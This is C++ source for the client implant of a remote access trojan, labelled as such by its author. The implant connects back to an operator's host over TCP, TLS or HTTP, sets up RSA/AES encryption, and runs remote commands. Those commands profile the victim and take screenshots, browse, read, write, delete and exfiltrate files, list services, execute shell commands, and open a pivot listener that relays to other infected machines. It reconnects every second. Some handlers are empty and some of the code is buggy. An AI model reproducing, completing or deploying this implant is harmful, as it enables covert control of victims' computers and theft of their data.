/*
Author: ISSAC

Introduction: Implant(RAT's client).
*/

#include <iostream>
#include <unistd.h>
#include <cstring>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <vector>
#include <tuple>
#include <thread>
#include <chrono>

#include <arpa/inet.h>

//OpenSSL
#include <openssl/ssl.h>
#include <openssl/err.h>

//Module
#include "clsEDP.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"
#include "clsDebugTools.hpp"

#include "clsInfoSpyder.hpp"
#include "clsScreenshot.hpp"
#include "clsFileMgr.hpp"
#include "clsProcMgr.hpp"
#include "clsServMgr.hpp"
#include "clsLoader.hpp"

#include "clsLtnTcp.hpp"

std::string g_szIP = "0.0.0.0";
uint16_t g_nPort = 5000;

const int g_nREAD_LENGTH = 65535;

std::ostringstream g_oss;

enum enConnectionMethod
{
    TCP,
    TLS,
    HTTP,
    DNS,
};

clsLtnTcp* g_ltpTcp = nullptr;

void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::string>& vuMsg)
{
    try
    {
        if (vuMsg.size() == 0)
            return;

        std::vector<std::string> vsMsg;
        if (vuMsg[0].rfind("Hacked_", 0) == 0)
        {
            vsMsg.reserve(vuMsg.size() - 1);
            vsMsg.insert(vsMsg.end(), vuMsg.begin() + 1, vuMsg.end());

            clsInfoSpyder infoSpider;
            std::string szVictimID = vuMsg[0];
            if (szVictimID != "Hacked_" + infoSpider.m_info.m_szMachineID)
            {
                if (g_ltpTcp != nullptr)
                    g_ltpTcp->fnSendToSub(szVictimID, vsMsg);

                return;
            }
            else if (szVictimID == "Hacked_" + infoSpider.m_info.m_szMachineID && vuMsg[1].rfind("Hacked", 0) == 0)
            {
                if (g_ltpTcp != nullptr)
                    g_ltpTcp->fnSendToSub(szVictimID, vsMsg);

                return;
            }
            else
            {
                
            }
        }
        else
        {
            vsMsg.reserve(vuMsg.size());
            vsMsg.insert(vsMsg.end(), vuMsg.begin(), vuMsg.end());
        }

        if (vsMsg[0] == "info") //Information.
        {
            clsInfoSpyder spy;
            clsScreenshot screen;

            auto stInfo = spy.m_info;
            std::string szImg = "X";
            if (stInfo.m_bHasDesktop)
            {
                auto stImage = screen.fnScreenshot();
                szImg = clsEZData::fnb64Encode(stImage.vuData);
            }

            victim->m_szVictimID = "Hacked_" + stInfo.m_szMachineID;


            std::vector<std::string> vsInfo = {
                "info",
                szImg,
                stInfo.m_bHasDesktop ? "1" : "0",
                stInfo.m_szIPv4,
                victim->m_szVictimID,
                stInfo.m_szUsername,
                std::to_string(stInfo.m_nUid),
                stInfo.m_bIsRoot ? "1" : "0",
                stInfo.m_szOSName,
            };

            victim->fnSendCommand(vsInfo);
        }
        else if (vsMsg[0] == "file") //File Manager.
        {
            clsFileMgr fileMgr;

            if (vsMsg[1] == "init") //Initialization.
            {
                std::vector<std::string> vsMsg = {
                    "file",
                    "init",
                    fileMgr.m_szInitFileDir,
                };

                victim->fnSendCommand(vsMsg);
            }
            else if (vsMsg[1] == "sd") //Scan directory.
            {
                auto ls = fileMgr.fnScandir(vsMsg[2]);
                std::vector<std::vector<std::string>> v2d;

                for (auto& s : ls)
                {
                    std::vector<std::string> x = {
                        s.mIsDir ? "1" : "0",
                        s.szFilePath,
                        std::to_string(s.nFileSize),
                        s.szPermission,
                        s.szCreationDate,
                        s.szLastModifiedDate,
                        s.szLastAccessedDate,
                    };

                    v2d.push_back(x);
                }

                std::vector<std::string> vuMsg = {
                    "file",
                    "sd",
                    vsMsg[2],
                    clsEZData::fnszSend2dParser(v2d, ","),
                };

                victim->fnSendCommand(vuMsg);
            }
            else if (vsMsg[1] == "wf") //Write file.
            {
                std::string szFilePath = vsMsg[2];
                std::string szFileContent = vsMsg[3];

                RETMSG msg = fileMgr.fntpWriteFile(szFilePath, szFileContent);
                auto [nCode, szPath] = msg;

                STRLIST ls = {
                    "file",
                    "wf",
                    std::to_string(nCode),
                    szPath,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "rf") //Read file.
            {
                std::string szFilePath = vsMsg[2];

                RETMSG msg = fileMgr.fntpReadFile(szFilePath);
                auto [nCode, szContent] = msg;

                STRLIST ls = {
                    "file",
                    "rf",
                    std::to_string(nCode),
                    szFilePath,
                    szContent,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "goto") //Check directory's existence.
            {
                std::string szPath = vsMsg[2];
                bool bExist = fileMgr.fnbDirExists(szPath);
                int nCode = (int)bExist;

                STRLIST ls = {
                    "file",
                    "goto",
                    std::to_string(nCode),
                    szPath,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "df") //Download file.
            {
                std::string szFilePath = vsMsg[2];
                size_t nChunk = atoi(vsMsg[3].data());

                std::thread thDownload(
                    [&fileMgr, &victim, &szFilePath, nChunk]() 
                    {
                        fileMgr.fnDownloadFile(victim, szFilePath, nChunk);
                    }
                );

                thDownload.join();
            }
            else if (vsMsg[1] == "uf") //Upload file.
            {

            }
            else if (vsMsg[1] == "wget") //WGET.
            {

            }
            else if (vsMsg[1] == "del") //Delete.
            {
                STR szPath = vsMsg[2];
                auto[nCode, szMsg] = fileMgr.fntpDelete(szPath);

                STRLIST ls = {
                    std::to_string(nCode),
                    szPath,
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "cp") //Copy.
            {
                STR szSrcPath = vsMsg[2];
                STR szDstPath = vsMsg[3];

                auto[nCode, szMsg] = fileMgr.fntpCopy(szSrcPath, szDstPath);

                STRLIST ls = {
                    std::to_string(nCode),
                    szSrcPath,
                    szDstPath,
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "mv") //Move.
            {
                STR szSrcPath = vsMsg[2];
                STR szDstPath = vsMsg[3];

                auto[nCode, szMsg] = fileMgr.fntpMove(szSrcPath, szDstPath);

                STRLIST ls = {
                    std::to_string(nCode),
                    szSrcPath,
                    szDstPath,
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "img") //Get image base64.
            {
                std::string szFilePath = vsMsg[2];
                BUFFER abBuffer = fileMgr.fnabReadImage(szFilePath);
                std::string szb64Img = clsEZData::fnb64Encode(abBuffer);

                STRLIST ls = {
                    "file",
                    "img",
                    szFilePath,
                    szb64Img,
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "nd") //New directory
            {
                std::string szDirPath = vsMsg[2];
                auto [nCode, szMsg] = fileMgr.fnMkdir(szDirPath);

                STRLIST ls = {
                    "file",
                    "nd",
                    szDirPath,
                    std::to_string(nCode),
                    szMsg,
                };

                victim->fnSendCommand(ls);
            }
        }
        else if (vsMsg[0] == "proc") //Process Manager.
        {
            clsProcMgr procMgr;

            if (vsMsg[1] == "ls")
            {

            }
        }
        else if (vsMsg[0] == "srv") //Service Manager.
        {
            clsServMgr srvMgr;

            if (vsMsg[1] == "ls")
            {
                std::vector<std::vector<std::string>> lsService;
                auto services = srvMgr.fnGetServices();
                for (auto& s : services)
                {
                    STRLIST vsSrv = {
                        s.szName,
                        s.szDescription,
                        s.szLoadState,
                        s.szActiveState,
                        s.szSubState,
                        s.szMainPid,
                        s.szExecStart,
                    };

                    lsService.push_back(vsSrv);
                }

                std::vector<std::string> vsMsg = {
                    "srv",
                    "ls",
                    clsEZData::fnszSend2dParser(lsService),
                };

                victim->fnSendCommand(vsMsg);
            }
        }
        else if (vsMsg[0] == "shell") //Remote Shell.
        {
            if (vsMsg[1] == "start")
            {

            }
            else if (vsMsg[1] == "stop")
            {

            }
            else if (vsMsg[1] == "exec")
            {
                std::string szOutput = clsTools::fnExec(vsMsg[2]);
            }
        }
        else if (vsMsg[0] == "loader") //Plugin Loader.
        {

        }
        else if (vsMsg[0] == "server") //Pivoting.
        {
            if (vsMsg[1] == "list")
            {

            }
            else if (vsMsg[1] == "start")
            {
                int nPort = std::stoi(vsMsg[2]);
                STR szRSAPublicKey = vsMsg[3];
                STR szRSAPrivateKey = vsMsg[4];

                if (g_ltpTcp != nullptr)
                {
                    if (!g_ltpTcp->m_bListening)
                    {
                        //todo: write log.
                        g_ltpTcp->fnStop();
                    }

                    delete g_ltpTcp;
                    g_ltpTcp = nullptr;
                }

                g_ltpTcp = new clsLtnTcp(victim, nPort, szRSAPublicKey, szRSAPrivateKey);
                std::thread([]() {
                    g_ltpTcp->fnStart();
                }).detach();

                STRLIST ls = {
                    "server",
                    "start",
                    "1",
                    "OK",
                };

                victim->fnSendCommand(ls);
            }
            else if (vsMsg[1] == "stop")
            {
                if (g_ltpTcp != nullptr && g_ltpTcp->m_bListening)
                {
                    g_ltpTcp->fnStop();
                    delete g_ltpTcp;
                    g_ltpTcp = nullptr;

                    STRLIST ls = {
                        "server",
                        "stop",
                        "1",
                        "OK",
                    };

                    victim->fnSendCommand(ls);
                }
                else
                {
                    STRLIST ls = {
                        "server",
                        "stop",
                        "0",
                        "No any listening.",
                    };

                    victim->fnSendCommand(ls);
                }
            }
        }
    }
    catch(const std::exception& e)
    {
        clsTools::fnLogErr(e.what());
    }
}

#pragma region Connection Handler

void fnTcpHandler(int sktSrv)
{
    clsTools::fnLogInfo("Starting session...");


    int nRecv = 0;
    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;

    //clsVictim victim(clsVictim::enMethod::TCP, sktSrv);
    
    std::shared_ptr<clsVictim> victim = std::make_shared<clsVictim>(clsVictim::enMethod::TCP, sktSrv);

    // initial handshake
    victim->fnSendCmdParam(0, 0);

    do
    {
        // Receive data
        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
        nRecv = recv(sktSrv, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);

        if (nRecv <= 0)
            break; // socket closed or error

        // Append to dynamic buffer
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStaticRecvBuf.begin(),
            vuStaticRecvBuf.begin() + nRecv);

        // --- Process complete packets ---
        while (true)
        {
            // not enough for header yet
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
                break;

            auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);

            // incomplete packet — wait for next recv
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                break;

            // construct EDP from full message
            clsEDP edp(vuDynamicRecvBuf);
            vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet

            auto [cmd, param, len, vuMsg] = edp.fnGetMsg();

            // === handle packet ===
            if (cmd == 0)
            {
                if (param == 0)
                {
                    close(sktSrv);
                    return;
                }
            }
            else if (cmd == 1)
            {
                if (param == 0)
                {
                    // --- handshake stage 2: receive RSA key ---
                    std::string szb64RSAKey(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    std::vector<unsigned char> vuRSAKey = clsEZData::fnb64Decode(szb64RSAKey);

                    // create crypto with RSA key
                    clsCrypto crypto(vuRSAKey);
                    victim->m_crypto = std::make_unique<clsCrypto>(vuRSAKey);

                    // generate AES key+IV, encrypt, and send
                    auto [vuAESKey, vuAESIV] = victim->m_crypto->fnCreateAESKey();
                    std::vector<unsigned char> ucKey(vuAESKey.begin(), vuAESKey.end());
                    std::vector<unsigned char> ucIV(vuAESIV.begin(), vuAESIV.end());

                    std::ostringstream oss;
                    oss << clsEZData::fnb64Encode(ucKey) << "|" << clsEZData::fnb64Encode(ucIV);

                    std::string szMsg = oss.str();
                    std::string szCipherMsg = clsEZData::fnb64EncodeUtf8(victim->m_crypto->fnvuRSAEncrypt(szMsg));

                    victim->fnSend(1, 1, szCipherMsg);
                }
                else if (param == 2)
                {
                    std::string szChallenge(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    std::string szCipher = clsEZData::fnb64EncodeUtf8(victim->m_crypto->fnvuAESEncrypt(szChallenge));

                    victim->fnSend(1, 3, szCipher);
                }
            }
            else if (cmd == 2)
            {
                if (param == 0)
                {
                    std::vector<unsigned char> vuPlain = victim->m_crypto->fnvuAESDecrypt(vuMsg);
                    std::string szMsg(vuPlain.begin(), vuPlain.end());

                    auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
                    
                    fnRecvCommand(victim, decoded);
                }
            }
        }

    } while (nRecv > 0);

    clsTools::fnLogInfo("Session is terminated.");
}

void fnHttpHandler(int sktSrv)
{
    clsTools::fnLogInfo("Starting session...");

    int nMaxRecv = 1024 * 1024 * 10;
    int nRecv = 0;
    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;

    clsHttpPkt http;
    //clsVictim victim(clsVictim::enMethod::HTTP, sktSrv, http);
    std::shared_ptr<clsVictim> victim = std::make_shared<clsVictim>(clsVictim::enMethod::HTTP, sktSrv, http);

    // initial handshake
    //victim->fnSendCmdParam(0, 0);

    do
    {
        vuDynamicRecvBuf.clear();
        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
        nRecv = recv(sktSrv, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);

        if (nRecv <= 0)
            break; // socket closed or error

        // Append to dynamic buffer
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStaticRecvBuf.begin(),
            vuStaticRecvBuf.begin() + nRecv);

        std::string szRecv(vuDynamicRecvBuf.begin(), vuDynamicRecvBuf.end());
        
        auto result = clsHttpPkt::fnParseHttpResponse(szRecv);
        std::string szBody = result.szBody;
        BUFFER abMsg = clsEZData::fnb64Decode(szBody);
        clsEDP edp(abMsg);
        
        auto[nCommand, nParam, nLength, vuMsg] = edp.fnGetMsg();
        std::string szMsg(vuMsg.begin(), vuMsg.end());

        clsTools::fnLogOK(szMsg);

        if (nCommand == 0)
        {
            if (nParam == 0)
            {

            }
        }
        else if (nCommand == 1)
        {
            if (nParam == 0)
            {
                BUFFER abRsaPublicKey = clsEZData::fnb64Decode(szMsg);


                // create crypto with RSA key
                //clsCrypto crypto(abRsaPublicKey);
                victim->m_crypto = std::make_unique<clsCrypto>(abRsaPublicKey);

                // generate AES key+IV, encrypt, and send
                auto [vuAESKey, vuAESIV] = victim->m_crypto->fnCreateAESKey();
                BUFFER ucKey(vuAESKey.begin(), vuAESKey.end());
                BUFFER ucIV(vuAESIV.begin(), vuAESIV.end());

                std::ostringstream oss;
                oss << clsEZData::fnb64Encode(ucKey) << "|" << clsEZData::fnb64Encode(ucIV);

                std::string szMsg = oss.str();
                std::string szCipherMsg = clsEZData::fnb64EncodeUtf8(victim->m_crypto->fnvuRSAEncrypt(szMsg));

                victim->fnSend(1, 1, szCipherMsg);
            }
            else if (nParam == 2)
            {
                std::string szChallenge(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                std::string szCipher = clsEZData::fnb64EncodeUtf8(victim->m_crypto->fnvuAESEncrypt(szChallenge));

                victim->fnSend(1, 3, szCipher);
            }
        }
        else if (nCommand == 2)
        {
            if (nParam == 0)
            {
                std::vector<unsigned char> vuPlain = victim->m_crypto->fnvuAESDecrypt(vuMsg);
                std::string szMsg(vuPlain.begin(), vuPlain.end());

                auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
             
                fnRecvCommand(victim, decoded);
            }
        }

    } while (nRecv > 0);

    clsTools::fnLogErr("Session is terminated.");
}

void fnTlsHandler(int nSktSrv, SSL* ssl)
{
    clsTools::fnLogInfo("Starting session...");

    //clsVictim victim(clsVictim::enMethod::TLS, nSktSrv, ssl);
    std::shared_ptr<clsVictim> victim = std::make_shared<clsVictim>(clsVictim::enMethod::TLS, nSktSrv, ssl);
    std::string szHello = "Hello TLS Server";

    victim->fnSendCommand(szHello);

    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;
    int nRecv = 0;

    do
    {
        // Receive data
        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
        nRecv = SSL_read(ssl, vuStaticRecvBuf.data(), vuStaticRecvBuf.size());

        if (nRecv <= 0)
            break; // socket closed or error

        // Append to dynamic buffer
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStaticRecvBuf.begin(),
            vuStaticRecvBuf.begin() + nRecv);

        // --- Process complete packets ---
        while (true)
        {
            // not enough for header yet
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
                break;

            auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);

            // incomplete packet — wait for next recv
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                break;

            // construct EDP from full message
            clsEDP edp(vuDynamicRecvBuf);
            vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet

            auto [cmd, param, len, vuMsg] = edp.fnGetMsg();

            std::string szMsg(vuMsg.begin(), vuMsg.end());

            auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
            
            fnRecvCommand(victim, decoded);
        }

    } while (nRecv > 0);
    
    clsTools::fnLogInfo("Session is terminated.");
}

#pragma endregion

#pragma region Connection

void fnTcpConnect(std::string& szIP, int nPort)
{
    try
    {
        int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in srvAddr {};
        srvAddr.sin_family = AF_INET;
        srvAddr.sin_port   = htons(nPort);
        inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);

        if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
        {
            perror("connect");
        }
        else
        {
            fnTcpHandler(sktSrv);
        }
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
    }
    
}

void fnTlsConnect(std::string& szIP, int nPort)
{
    SSL_library_init();
    SSL_load_error_strings();

    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);

    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);

    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(nPort);
    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);
    
    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        perror("connect");
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sktSrv);
    if (SSL_connect(ssl) <= 0)
    {
        ERR_print_errors_fp(stderr);
        return;
    }

    fnTlsHandler(sktSrv, ssl);

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sktSrv);
    SSL_CTX_free(ctx);
}

void fnHttpConnect(std::string& szIP, int nPort)
{
    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(nPort);
    inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        perror("connect");
    }
    else
    {
        fnHttpHandler(sktSrv);
    }

    close(sktSrv);
}

void fnDnsConnect(std::string& szIP, int nPort)
{

}

#pragma endregion

int main(int argc, char *argv[])
{
    enConnectionMethod enMethod;

    if (argc >= 3)
    {
        g_szIP = argv[1];
        g_nPort = atoi(argv[2]);

        std::ostringstream oss;

        oss << "Input host: " << g_szIP << ":" << g_nPort;
        clsTools::fnLogInfo(oss.str());
        oss.clear();

        if (argc == 4)
        {
            std::string method(argv[3]);
            method = clsEZData::fnStrToUpper(method);

            clsTools::fnLogInfo("Method: " + method);

            if (method == "TCP")
                enMethod = enConnectionMethod::TCP;
            else if (method == "TLS")
                enMethod = enConnectionMethod::TLS;
            else if (method == "HTTP")
                enMethod = enConnectionMethod::HTTP;
            else if (method == "DNS")
                enMethod = enConnectionMethod::DNS;
            else
                enMethod == enConnectionMethod::TLS;
        }
    }

    while (true)
    {
        switch (enMethod)
        {
            case enConnectionMethod::TCP:
                fnTcpConnect(g_szIP, g_nPort);
                break;
            case enConnectionMethod::TLS:
                fnTlsConnect(g_szIP, g_nPort);
                break;
            case enConnectionMethod::HTTP:
                fnHttpConnect(g_szIP, g_nPort);
                break;
            case enConnectionMethod::DNS:
                fnDnsConnect(g_szIP, g_nPort);
                break;
            default:
                fnTcpConnect(g_szIP, g_nPort);
                break;
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(1000));

    }
}